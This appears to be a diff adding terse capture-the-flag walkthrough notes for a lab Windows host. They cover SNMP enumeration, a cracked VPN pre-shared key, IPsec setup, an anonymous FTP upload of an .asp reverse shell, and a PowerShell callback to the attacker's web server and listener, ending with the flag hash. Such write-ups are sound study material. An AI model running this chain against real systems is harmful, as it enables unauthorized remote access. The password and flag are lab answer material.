@@ -1,0 +1,84 @@
+#10.10.10.116
+#PORT- 161(snmp, v1), 500(isakmp[Internet Security Association and
+Key Management Protocol], win8)
+
+#nmap udp
+#dirb
+
+#use snmpwalk to enum
+snmpwalk -c public 10.10.10.116 -v 1  
+#IKE VPN password PSK=  9C8B1A372B1878851BE2C097031B6E43   ==> [ Dudecake1! ]
+#STRING= Conceal
+
+-------------------------------------------------------
+#Learn about IPSec
+>>>https://www.youtube.com/watch?v=tuDVWQOG0C0
+
+-----------------------------------------------------
+#STRONGSWAN TOOL
+-----------------------------------------------------
+#download 'strongswan' tool for connecting to port 500
+apt install strongswan 	  (default location for conf file is in '/etc/ipsec.conf' & '/etc/ipsec.secrets')
+	OR
+#download strongswan zip from internet		(used)
+>>>https://linoxide.com/security/install-strongswan/
+#copy zip into '/usr/src' and extract there	
+>>>https://linoxide.com/security/install-strongswan/
+#default location for conf file is in '/usr/local/etc/*'
+
+#Configure strongswan   (see files)
+#check 'ipsec.conf' & 'ipsec.secrets' file
+>>>https://www.alibabacloud.com/help/doc-detail/65374.htm
+
+#if any error occur then check out the Error reason
+>>>https://www.netgate.com/docs/pfsense/vpn/ipsec/ipsec-troubleshooting.html
+
+#run these cmd
+ipsec restart/reload   (ipsec start)
+ipsec up conceal
+ipsec statusall
+#conncection established
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++
+#USE MOBILE NETWORK FOR GOOD CONNECTIVITY
+++++++++++++++++++++++++++++++++++++++++++++++++++++++
+#now check open ports
+snmp-check 10.10.10.116
+	[OR]
+nc -w 1 -z -v 10.10.10.116 1-1000
+#found port open-  21, 80, 135, 139, 445
+#dirb 
+dirb http://10.10.10.116  -->  /upload
+
+#ftp anonymous login
+ftp 10.10.10.116
+#change mode/type to binary
+binary
+#upload .asp reverse shell   (uploading .asp file {rather than .php} because it is windows server,  asp= Active Server Page )
+#run this cmd on ftp server
+put winshell.asp
+
+#check winshell.asp file --> we need to invoke powershell
+#download Invoke-PowerShellTcp.ps1 and paste into /var/www/html/
+>>>https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+
+#start localhost server so that .asp can connect to our local server to invoke powershell  [ via http://localhost/Invoke-PowerShellTcp.ps1 ]
+service apache2 start
+
+#start listener on 4444 (according to .asp lport)
+
+#to execute .asp access:
+http://10.10.10.116/upload/winshell.asp
+
+--------------------------------
+#INSIDE POWER SHELL
+--------------------------------
+#found proof.txt file inside /Desktop/proof.txt
+
+
+#key
+6E9FDFE0DCB66E700FB9CB824AE5A6FF
+
+++++++++++++++++++++++++++++++++
+@peek, @maxxx, @kekra
+++++++++++++++++++++++++++++++++
